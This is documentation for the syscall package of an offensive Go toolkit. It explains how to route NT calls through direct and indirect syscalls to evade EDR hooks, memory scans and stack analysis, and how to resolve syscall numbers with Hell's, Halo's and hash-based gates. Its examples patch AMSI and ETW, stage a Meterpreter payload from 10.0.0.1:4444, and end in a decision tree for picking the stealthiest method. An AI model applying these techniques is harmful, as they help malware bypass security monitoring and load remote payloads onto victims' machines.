# Syscall Methods

[<- Back to README](../README.md)

The `win/syscall` package provides a `Caller` that routes NT function calls through four strategies, allowing the same injection or evasion code to transparently switch between detectable WinAPI calls and stealthy indirect syscalls.

### Related package — `win/ntapi`

`win/ntapi` is the layer immediately underneath `win/syscall`:

- **Native NT structures** — `PEB`, `TEB`, `RTL_USER_PROCESS_PARAMETERS`,
  `CLIENT_ID`, `OBJECT_ATTRIBUTES`, `UNICODE_STRING`, `PROCESS_BASIC_INFORMATION`
  mirrored as Go structs with correct x64 layout + offsets.
- **Helpers** — PEB walk (`CurrentPEB`, `ModuleBaseFromPEB`), unicode-string
  builders (`NewUnicodeString`), status-code mapping (`NTSTATUS.Error`).
- **Used by** — `evasion/unhook`, `evasion/phant0m`, `inject/phantomdll`,
  `inject/modulestomp`, `evasion/fakecmd`, `evasion/hideprocess`,
  `evasion/stealthopen`, `pe/clr`.

`win/ntapi` does **not** execute syscalls — it supplies the data
structures `win/syscall`'s `Caller` operates on. Typical usage:

```go
import (
    "github.com/oioio-space/maldev/win/ntapi"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

peb := ntapi.CurrentPEB()
ntdllBase := ntapi.ModuleBaseFromPEB(peb, "ntdll.dll")
// … then use wsyscall.Caller to invoke Nt* functions …
```

---

## How Windows Syscalls Work

Every NT function in `ntdll.dll` follows the same pattern on x64:

```asm
mov r10, rcx         ; save first arg (Windows syscall convention uses r10, not rcx)
mov eax, <SSN>       ; load the Syscall Service Number
syscall              ; transition to kernel
ret
```

The SSN (Syscall Service Number) is an index into the kernel's System Service Descriptor Table (SSDT). EDR products hook these functions by overwriting the prologue bytes with a JMP to their monitoring code.

---

## Method Comparison

| Method | Constant | Bypass kernel32 hooks | Bypass ntdll hooks | Survive memory scan | Survive stack analysis |
|--------|----------|----------------------|-------------------|--------------------|-----------------------|
| WinAPI | `MethodWinAPI` | No | No | -- | -- |
| NativeAPI | `MethodNativeAPI` | Yes | No | -- | -- |
| Direct | `MethodDirect` | Yes | Yes | No | -- |
| Indirect | `MethodIndirect` | Yes | Yes | Yes | Yes |

### MethodWinAPI

Calls the NT function through `ntdll.dll` using Go's `LazyProc.Call()`. This is the standard way Windows APIs are invoked. The call flows through kernel32.dll (or advapi32.dll) down to ntdll.dll, and then into the kernel.

**At the OS level:** `LazyProc.Find()` resolves the export address in ntdll.dll, then `proc.Call()` invokes it via Go's `syscall.SyscallN`. Both the kernel32 and ntdll entry points are visible to EDR hooks.

**When to use:** Development, testing, or environments without EDR. Maximum compatibility.

### MethodNativeAPI

Identical implementation to WinAPI -- both call through `ntdll.dll` via `LazyProc`. The distinction exists so callers can express intent ("I want to call NtXxx directly, not the kernel32 wrapper"). In practice, for NT functions like `NtAllocateVirtualMemory`, the WinAPI and NativeAPI paths are the same because these functions only exist in ntdll.

**At the OS level:** Same as WinAPI. The call lands at the ntdll export address, which EDR can hook.

**When to use:** When you want to bypass kernel32 hooks specifically (e.g., hooks on `VirtualAlloc` in kernel32 that redirect before reaching `NtAllocateVirtualMemory` in ntdll). In practice, most EDRs hook at the ntdll level, so this offers limited additional stealth.

### MethodDirect

Builds a tiny assembly stub in RWX memory that contains the `syscall` instruction. The stub executes the syscall from your process's private memory, never touching the (potentially hooked) ntdll code.

**At the OS level:** The Caller resolves the SSN via the configured resolver, then:

1. Allocates RWX memory via `VirtualAlloc`.
2. Writes this 12-byte stub into it:

```text
Offset  Bytes             Instruction          Purpose
------  -----             -----------          -------
0x00    4C 8B D1          mov r10, rcx         Copy first arg to r10 (kernel expects it there)
0x03    B8 XX XX 00 00    mov eax, <SSN>       Load the syscall number
0x07    0F 05             syscall              Transition to kernel mode
0x09    C3                ret                  Return to caller
```

3. Calls the stub via `syscall.SyscallN(stubAddr, args...)`.
4. Frees the stub memory.

**Detection risk:** Memory scanners can flag the `0F 05` (`syscall`) instruction outside of ntdll's address range. EDRs that check "did this syscall come from ntdll?" will detect this.

**When to use:** EDR hooks ntdll but does not perform call-stack analysis or memory scanning for syscall instructions.

### MethodIndirect

Like Direct, but instead of executing `syscall` in private memory, it JMPs to a `syscall; ret` gadget found inside ntdll itself. The kernel-mode transition appears to originate from ntdll's address space.

**At the OS level:** The Caller resolves the SSN, then:

1. Scans ntdll's `.text` section for the byte sequence `0F 05 C3` (`syscall; ret`). This gadget exists in every unhooked NT function's epilogue.
2. Allocates RWX memory and writes this ~21-byte stub:

```text
Offset  Bytes                          Instruction            Purpose
------  -----                          -----------            -------
0x00    4C 8B D1                       mov r10, rcx           Copy first arg
0x03    B8 XX XX 00 00                 mov eax, <SSN>         Load syscall number
0x07    49 BB <8 bytes gadget addr>    mov r11, <gadget>      Load gadget address
0x11    41 FF E3                       jmp r11                Jump into ntdll
```

3. Calls the stub. Execution flows: stub -> JMP to ntdll gadget -> `syscall; ret` -> returns to caller.

**Why this defeats stack analysis:** When the kernel examines the return address on the stack, it sees an address inside ntdll.dll. Memory scanners see the `syscall` instruction at a legitimate ntdll address.

**Gadget scanning:** `findSyscallGadget` parses the PE headers of ntdll (MZ -> PE -> section table), finds the `.text` section, and linearly scans for `0F 05 C3`. The first match is used.

**When to use:** Maximum stealth. The EDR hooks ntdll AND performs call-stack analysis AND scans for out-of-module syscall instructions.

---

## SSN Resolvers

The SSN (Syscall Service Number) changes between Windows builds. Resolvers determine the correct SSN at runtime by reading ntdll's in-memory code.

### SSNResolver Interface

```go
type SSNResolver interface {
    Resolve(ntFuncName string) (uint16, error)
}
```

### HellsGateResolver

```go
resolver := wsyscall.NewHellsGate()
```

**How it works:** Reads the first 8 bytes of the target function's prologue in ntdll:

```text
Expected:  4C 8B D1 B8 XX XX 00 00
           -------- -- --------
           mov r10  mov eax, SSN
```

If bytes 0-3 match `4C 8B D1 B8`, the SSN is extracted from bytes 4-5 (little-endian uint16).

**Limitation:** Fails if the function is hooked. EDR hooks typically overwrite the first bytes with a JMP (`E9` or `EB`), so the `4C 8B D1 B8` pattern will not match.

### HalosGateResolver

```go
resolver := wsyscall.NewHalosGate()
```

**How it works:** First tries Hell's Gate. If the target function is hooked, it scans neighboring syscall stubs. On x64, each ntdll syscall stub is exactly 32 bytes, and SSNs are assigned sequentially. If the function at `addr - N*32` has an intact prologue with `SSN=X`, then the target's SSN is `X + N`.

The scan checks up to 500 stubs in both directions (above and below the target function).

**Why it works:** EDRs typically only hook a subset of NT functions (the "interesting" ones like `NtAllocateVirtualMemory`, `NtCreateThreadEx`, etc.). Neighboring functions that are not security-relevant remain unhooked, and their SSNs reveal the target's SSN by arithmetic.

### TartarusGateResolver

```go
resolver := wsyscall.NewTartarus()
```

Extends Halo's Gate by recognizing JMP-hook patches and extracting the original SSN from the hook displacement. Currently delegates to `HalosGateResolver` (the JMP-displacement analysis is not yet implemented).

### HashGateResolver

```go
resolver := wsyscall.NewHashGate()
```

**How it works:** Resolves NT function addresses via PEB walk and ROR13 export hashing instead of `ntdll.NewProc(name)`. This avoids using any string-based function resolution — the binary contains only `uint32` hashes, not function names like `"NtAllocateVirtualMemory"`.

1. Walks the PEB `InLoadOrderModuleList` to find ntdll by hashing each module's `BaseDllName` (UTF-16LE) with ROR13+null.
2. Parses ntdll's PE export directory in-memory, hashing each export name with ROR13.
3. Once the function address is found, extracts the SSN from the prologue using the same Hell's Gate pattern (`4C 8B D1 B8`).

The ntdll base address is cached after the first resolution for performance.

**Limitation:** Like Hell's Gate, fails if the target function's prologue is hooked. Combine with `HalosGate` or `TartarusGate` via `Chain` for resilience.

**When to use:** When plaintext NT function names in the binary are a concern (static analysis, YARA rules). The binary will contain only `uint32` hash constants instead of readable strings.

### ChainResolver

```go
resolver := wsyscall.Chain(
    wsyscall.NewHashGate(),   // try PEB walk + hash first (no strings)
    wsyscall.NewHellsGate(),  // fallback: string-based resolution
    wsyscall.NewHalosGate(),  // fallback: neighbor scanning
    wsyscall.NewTartarus(),   // fallback: JMP hook analysis
)
```

**Purpose:** Tries each resolver in order. Returns the first successful result.

**Why:** Provides resilience. If HashGate fails (PEB walk issue), Hell's Gate resolves by name. If that fails (function hooked), Halo's Gate recovers via neighbor scanning. If all neighbors are hooked, Tartarus tries JMP displacement analysis.

---

## Caller

### New

```go
func New(method Method, r SSNResolver) *Caller
```

**Parameters:**
- `method` -- One of `MethodWinAPI`, `MethodNativeAPI`, `MethodDirect`, `MethodIndirect`.
- `r` -- An `SSNResolver`. Only required for `MethodDirect` and `MethodIndirect` (pass `nil` for WinAPI/NativeAPI).

### Call

```go
func (c *Caller) Call(ntFuncName string, args ...uintptr) (uintptr, error)
```

**Parameters:**
- `ntFuncName` -- The NT function name exactly as exported by ntdll (e.g., `"NtAllocateVirtualMemory"`).
- `args` -- The function arguments as `uintptr` values.

**Returns:** `(NTSTATUS, error)`. NTSTATUS 0 = success.

---

## Complete Examples

### Example 1: Standard WinAPI (no resolver needed)

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

caller := wsyscall.New(wsyscall.MethodWinAPI, nil)

// Allocate memory via NtAllocateVirtualMemory
var addr uintptr
var regionSize uintptr = 4096
status, err := caller.Call("NtAllocateVirtualMemory",
    ^uintptr(0),                        // current process
    uintptr(unsafe.Pointer(&addr)),
    0,
    uintptr(unsafe.Pointer(&regionSize)),
    windows.MEM_COMMIT|windows.MEM_RESERVE,
    uintptr(windows.PAGE_READWRITE),
)
```

### Example 2: Direct Syscall with Hell's Gate

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

caller := wsyscall.New(wsyscall.MethodDirect, wsyscall.NewHellsGate())

// Same Call API -- the stub is built and destroyed per invocation
status, err := caller.Call("NtProtectVirtualMemory",
    ^uintptr(0),
    uintptr(unsafe.Pointer(&baseAddr)),
    uintptr(unsafe.Pointer(&regionSize)),
    uintptr(windows.PAGE_EXECUTE_READ),
    uintptr(unsafe.Pointer(&oldProtect)),
)
```

### Example 3: Indirect Syscall with HashGate (No Strings in Binary)

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

// HashGate resolves NT functions via PEB walk + ROR13 hash comparison.
// The binary contains zero plaintext function names — only uint32 hashes.
caller := wsyscall.New(
    wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()),
)

// Pass to any technique package
err := amsi.PatchScanBuffer(caller)
err = etw.Patch(caller)
err = blockdlls.Enable(caller)
```

### Example 4: Passing Caller to Meterpreter

```go
import (
    wsyscall "github.com/oioio-space/maldev/win/syscall"
    "github.com/oioio-space/maldev/c2/meterpreter"
)

caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHalosGate())

stager := meterpreter.NewStager(&meterpreter.Config{
    Transport: meterpreter.TransportTCP,
    Host:      "10.0.0.1",
    Port:      "4444",
    Caller:    caller, // VirtualAlloc/Protect/CreateThread go through indirect syscalls
})
```

### Example 5: Standalone API Hashing (PEB Walk)

```go
import "github.com/oioio-space/maldev/win/api"

// Resolve any function by hash — no string in binary
addr, err := api.ResolveByHash(api.HashKernel32, api.HashLoadLibraryA)

// Or step by step:
ntdllBase, _ := api.ModuleByHash(api.HashNtdll)
ntAllocAddr, _ := api.ExportByHash(ntdllBase, api.HashNtAllocateVirtualMemory)

// Pre-computed constants match hash.ROR13 / hash.ROR13Module:
//   api.HashKernel32 = hash.ROR13Module("KERNEL32.DLL") = 0x50BB715E
//   api.HashLoadLibraryA = hash.ROR13("LoadLibraryA") = 0xEC0E4E8E
```

---

## Nil Caller Convention

All technique packages that accept a `*wsyscall.Caller` parameter treat `nil` as "use standard WinAPI". This makes the syscall method entirely opt-in:

```go
// These are equivalent:
err := amsi.PatchScanBuffer(nil)                                          // standard WinAPI
err = amsi.PatchScanBuffer(wsyscall.New(wsyscall.MethodWinAPI, nil))      // explicit WinAPI
```

## Choosing a Method -- Decision Tree

```text
Is there an EDR?
  No  --> MethodWinAPI (simplest, most compatible)
  Yes --> Does the EDR hook kernel32?
    No  --> MethodWinAPI
    Yes --> Does the EDR hook ntdll?
      No  --> MethodNativeAPI
      Yes --> Does the EDR scan for out-of-module syscall instructions?
        No  --> MethodDirect + NewHellsGate()
        Yes --> Does the EDR do call-stack analysis?
          No  --> MethodDirect + NewHalosGate()
          Yes --> MethodIndirect + Chain(NewHellsGate(), NewHalosGate())
```
